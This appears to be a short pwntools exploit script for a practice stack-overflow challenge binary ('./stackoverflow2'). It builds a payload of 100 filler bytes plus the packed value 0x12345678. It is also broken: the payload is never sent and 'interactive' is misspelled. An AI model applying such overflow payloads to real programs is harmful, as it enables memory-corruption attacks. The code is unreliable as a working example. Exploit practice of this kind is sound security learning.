from pwn import *

sh = process("./stackoverflow2")

sh.recvuntil("input:")

payload = 100*'a'+p32(305419896)#+p32(0x12345678)

'''
'''



sh.interative()